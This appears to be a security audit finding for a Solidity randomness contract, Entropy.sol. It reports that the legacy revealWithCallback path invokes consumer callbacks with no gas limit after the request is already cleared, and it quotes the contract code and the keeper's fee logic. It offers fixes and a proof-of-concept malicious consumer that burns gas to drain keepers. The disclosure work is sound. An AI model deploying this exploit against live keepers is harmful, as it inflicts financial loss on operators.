### Title
Provider Keeper Can Incur Unbounded Gas Loss Without Ability to Revert in `revealWithCallback` Legacy Path — (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

In `Entropy.sol`'s `revealWithCallback`, when a provider has `defaultGasLimit == 0` (legacy mode), the consumer's `_entropyCallback` is invoked with **no gas limit**. The request is cleared before the callback (CEI pattern), so the keeper has no ability to revert after the callback executes. A malicious consumer can perform arbitrary gas-intensive operations during the callback at the keeper's expense, making the `revealWithCallback` transaction unprofitable — with no recourse.

---

### Finding Description

`revealWithCallback` has two execution paths, branching on `req.gasLimit10k`:

**New path** (`req.gasLimit10k != 0`): uses `excessivelySafeCall` with an explicit gas cap, catches reverts, and emits a `CallbackFailed` event.

**Legacy path** (`req.gasLimit10k == 0`): calls `_entropyCallback` directly with **no gas limit**:

```solidity
if (len != 0) {
    IEntropyConsumer(callAddress)._entropyCallback(
        sequenceNumber,
        provider,
        randomNumber
    );
}
``` [1](#0-0) 

The legacy path is triggered when `req.gasLimit10k == 0`. This is set in `requestHelper` when the provider's `defaultGasLimit == 0`:

```solidity
if (providerInfo.defaultGasLimit == 0) {
    req.gasLimit10k = 0;
}
``` [2](#0-1) 

Critically, this applies even when the user passes a non-zero `gasLimit` to `requestV2` — if the provider's `defaultGasLimit` is 0, the request's `gasLimit10k` is forced to 0 regardless. The test confirms this:

```solidity
// A provider with a 0 gas limit is opted-out of the failure state flow
assertGasLimitAndFee(100000, 0, 1); // gasLimit10k=0 even for 100k gas request
``` [3](#0-2) 

The fee for a no-gas-limit request is just the provider's base `feeInWei` — there is **no gas component**:

```solidity
function getProviderFee(...) internal view returns (uint128 feeAmount) {
    ...
    if (provider.defaultGasLimit > 0 && roundedGasLimit > provider.defaultGasLimit) {
        // scaled fee
    } else {
        return provider.feeInWei; // base fee only
    }
}
``` [4](#0-3) 

The execution order in the legacy path is:
1. `clearRequest(provider, sequenceNumber)` — state committed, keeper cannot revert
2. `_entropyCallback(...)` — called with **no gas limit**, consumer controls all remaining gas
3. Events emitted — no opportunity for keeper to abort [5](#0-4) 

`requestWithCallback` routes through `requestV2(..., gasLimit=0)`, which feeds into `requestHelper` with `callbackGasLimit=0`:

```solidity
function requestWithCallback(address provider, bytes32 userContribution) public payable override returns (uint64) {
    return requestV2(provider, userContribution, 0);
}
``` [6](#0-5) 

---

### Impact Explanation

A malicious consumer pays only the provider's base `feeInWei` but can consume **all remaining gas** in the keeper's `revealWithCallback` transaction. The consumer can use this to:

- Mint gas tokens (on applicable chains)
- Deploy contracts
- Perform additional swaps or state-heavy operations
- Subsidize any gas-intensive operation at the keeper's expense

The keeper's revenue model is based on `feeInWei` covering the cost of the `revealWithCallback` transaction. If the consumer's callback consumes gas far exceeding what `feeInWei` covers at the prevailing gas price, the keeper operates at a loss. The keeper has **no ability to revert** after the callback — the request is already cleared and fees already credited to the provider.

The Fortuna keeper's fee adjustment logic targets `(gas_limit) * (current gas price)` as the cost model:

```rust
let max_callback_cost: u128 = estimate_tx_cost(middleware, legacy_tx, gas_limit).await?;
``` [7](#0-6) 

But for legacy-path requests (`gasLimit10k == 0`), `gas_limit` is 0, so the cost model underestimates the actual gas consumed by a malicious callback.

---

### Likelihood Explanation

- The legacy path (`defaultGasLimit == 0`) is still active and supported. Any provider that has not called `setDefaultGasLimit` with a non-zero value is vulnerable.
- `requestWithCallback` is a public, permissionless entry point — any unprivileged user can make a request.
- The random number is not known until execution, so the keeper cannot accurately `estimateGas` for a callback that branches on the random number value (e.g., `if (uint256(randomNumber) % 2 == 0) { /* gas-intensive op */ }`).
- The attack requires no special privileges, no leaked keys, and no governance access.

---

### Recommendation

1. **Enforce a gas limit in the legacy path**: Apply a configurable cap (e.g., `provider.feeInWei / tx.gasprice`) to the callback call in the else branch, or use `excessivelySafeCall` with a reasonable default.
2. **Deprecate the legacy path**: Require all providers to set `defaultGasLimit > 0` before accepting new `requestWithCallback` calls.
3. **Add a post-callback profitability check**: Allow the caller of `revealWithCallback` to pass a minimum-profit threshold; revert if the callback consumed more gas than covered by the fee. This mirrors the UniswapX recommendation of a final filler callback.
4. **Document the risk**: Warn keepers that legacy-path requests expose them to unbounded gas consumption.

---

### Proof of Concept

```solidity
// Malicious consumer contract
contract MaliciousConsumer is IEntropyConsumer {
    IEntropy entropy;
    constructor(address _entropy) { entropy = IEntropy(_entropy); }

    function attack(address provider) external payable {
        // Provider must have defaultGasLimit == 0 (legacy mode)
        // Fee = base feeInWei only, no gas component
        uint128 fee = entropy.getFee(provider);
        entropy.requestWithCallback{value: fee}(provider, bytes32(uint256(1)));
    }

    function entropyCallback(uint64, address, bytes32 randomNumber) internal override {
        // Consume all remaining gas at keeper's expense
        // Keeper cannot revert — request already cleared before this runs
        if (uint256(randomNumber) % 2 == 0) {
            // Gas-intensive operation: deploy contracts, mint gas tokens, etc.
            for (uint i = 0; i < 1000; i++) {
                new GasConsumer(); // deploy contracts to consume gas
            }
        }
    }

    function getEntropy() internal view override returns (address) { return address(entropy); }
}
```

**Attack flow:**
1. Attacker deploys `MaliciousConsumer` and calls `attack()` against a provider with `defaultGasLimit == 0`, paying only `feeInWei`.
2. Keeper's `revealWithCallback` transaction executes: request is cleared, then `_entropyCallback` is called with no gas limit.
3. If `randomNumber % 2 == 0` (50% chance), the callback deploys 1000 contracts, consuming millions of gas.
4. Keeper pays for all gas consumed. Keeper cannot revert. Net loss to keeper = gas_consumed × gas_price − feeInWei.
5. Attacker can repeat with many requests to drain the keeper's balance. [8](#0-7)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L268-271)
```text
        if (providerInfo.defaultGasLimit == 0) {
            // Provider doesn't support the new callback failure state flow (toggled by setting the gas limit field).
            // Set gasLimit10k to 0 to disable.
            req.gasLimit10k = 0;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L346-356)
```text
    function requestWithCallback(
        address provider,
        bytes32 userContribution
    ) public payable override returns (uint64) {
        return
            requestV2(
                provider,
                userContribution,
                0 // Passing 0 will assign the request the provider's default gas limit
            );
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L541-703)
```text
    // Anyone can call this method to fulfill a request, but the callback will only be made to the original requester.
    function revealWithCallback(
        address provider,
        uint64 sequenceNumber,
        bytes32 userContribution,
        bytes32 providerContribution
    ) public override {
        EntropyStructsV2.Request storage req = findActiveRequest(
            provider,
            sequenceNumber
        );

        if (
            !(req.callbackStatus ==
                EntropyStatusConstants.CALLBACK_NOT_STARTED ||
                req.callbackStatus == EntropyStatusConstants.CALLBACK_FAILED)
        ) {
            revert EntropyErrors.InvalidRevealCall();
        }

        bytes32 randomNumber;
        (randomNumber, ) = revealHelper(
            req,
            userContribution,
            providerContribution
        );

        // If the request has an explicit gas limit, then run the new callback failure state flow.
        //
        // Requests that haven't been invoked yet will be invoked safely (catching reverts), and
        // any reverts will be reported as an event. Any failing requests move to a failure state
        // at which point they can be recovered. The recovery flow invokes the callback directly
        // (no catching errors) which allows callers to easily see the revert reason.
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
        ) {
            req.callbackStatus = EntropyStatusConstants.CALLBACK_IN_PROGRESS;
            bool success;
            bytes memory ret;
            uint256 startingGas = gasleft();
            (success, ret) = req.requester.excessivelySafeCall(
                // Warning: the provided gas limit below is only an *upper bound* on the gas provided to the call.
                // At most 63/64ths of the current context's gas will be provided to a call, which may be less
                // than the indicated gas limit. (See CALL opcode docs here https://www.evm.codes/?fork=cancun#f1)
                // Consequently, out-of-gas reverts need to be handled carefully to ensure that the callback
                // was truly provided with a sufficient amount of gas.
                uint256(req.gasLimit10k) * TEN_THOUSAND,
                256, // copy at most 256 bytes of the return value into ret.
                abi.encodeWithSelector(
                    IEntropyConsumer._entropyCallback.selector,
                    sequenceNumber,
                    provider,
                    randomNumber
                )
            );
            uint32 gasUsed = SafeCast.toUint32(startingGas - gasleft());
            // Reset status to not started here in case the transaction reverts.
            req.callbackStatus = EntropyStatusConstants.CALLBACK_NOT_STARTED;

            if (success) {
                emit RevealedWithCallback(
                    EntropyStructConverter.toV1Request(req),
                    userContribution,
                    providerContribution,
                    randomNumber
                );
                emit EntropyEventsV2.Revealed(
                    provider,
                    req.requester,
                    req.sequenceNumber,
                    randomNumber,
                    userContribution,
                    providerContribution,
                    false,
                    ret,
                    SafeCast.toUint32(gasUsed),
                    bytes("")
                );
                clearRequest(provider, sequenceNumber);
            } else if (
                (startingGas * 31) / 32 >
                uint256(req.gasLimit10k) * TEN_THOUSAND
            ) {
                // The callback reverted for some reason.
                // We don't use ret to condition the behavior here (out-of-gas or other revert), as we have found that some user contracts
                // catch out-of-gas errors and revert with a different error.
                // In this case, ensure that the callback was provided with sufficient gas. Technically, 63/64ths of the startingGas is forwarded,
                // but we're using 31/32 to introduce a margin of safety.
                emit CallbackFailed(
                    provider,
                    req.requester,
                    sequenceNumber,
                    userContribution,
                    providerContribution,
                    randomNumber,
                    ret
                );
                emit EntropyEventsV2.Revealed(
                    provider,
                    req.requester,
                    sequenceNumber,
                    randomNumber,
                    userContribution,
                    providerContribution,
                    true,
                    ret,
                    SafeCast.toUint32(gasUsed),
                    bytes("")
                );
                req.callbackStatus = EntropyStatusConstants.CALLBACK_FAILED;
            } else {
                // Callback reverted by (potentially) running out of gas, but the calling context did not have enough gas
                // to run the callback. This is a corner case that can happen due to the nuances of gas passing
                // in calls (see the comment on the call above).
                //
                // (Note that reverting here plays nicely with the estimateGas RPC method, which binary searches for
                // the smallest gas value that causes the transaction to *succeed*. See https://github.com/ethereum/go-ethereum/pull/3587 )
                revert EntropyErrors.InsufficientGas();
            }
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
            uint32 gasUsed = SafeCast.toUint32(startingGas - gasleft());

            emit RevealedWithCallback(
                reqV1,
                userContribution,
                providerContribution,
                randomNumber
            );
            emit EntropyEventsV2.Revealed(
                provider,
                callAddress,
                sequenceNumber,
                randomNumber,
                userContribution,
                providerContribution,
                false,
                bytes(""),
                gasUsed,
                bytes("")
            );
        }
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L780-793)
```text
        uint32 roundedGasLimit = uint32(roundTo10kGas(gasLimit)) * TEN_THOUSAND;
        if (
            provider.defaultGasLimit > 0 &&
            roundedGasLimit > provider.defaultGasLimit
        ) {
            // This calculation rounds down the fee, which means that users can get some gas in the callback for free.
            // However, the value of the free gas is < 1 wei, which is insignificant.
            uint128 additionalFee = ((roundedGasLimit -
                provider.defaultGasLimit) * provider.feeInWei) /
                provider.defaultGasLimit;
            return provider.feeInWei + additionalFee;
        } else {
            return provider.feeInWei;
        }
```

**File:** target_chains/ethereum/contracts/test/Entropy.t.sol (L1730-1738)
```text
        // A provider with a 0 gas limit is opted-out of the failure state flow, indicated by
        // a 0 gas limit on all requests.
        vm.prank(provider1);
        random.setDefaultGasLimit(0);

        assertGasLimitAndFee(0, 0, 1);
        assertGasLimitAndFee(10000, 0, 1);
        assertGasLimitAndFee(20000, 0, 1);
        assertGasLimitAndFee(100000, 0, 1);
```

**File:** apps/fortuna/src/keeper/fee.rs (L305-308)
```rust
    let gas_limit: u128 = u128::from(provider_info.default_gas_limit);
    let max_callback_cost: u128 = estimate_tx_cost(middleware, legacy_tx, gas_limit)
        .await
        .map_err(|e| anyhow!("Could not estimate transaction cost. error {:?}", e))?;
```
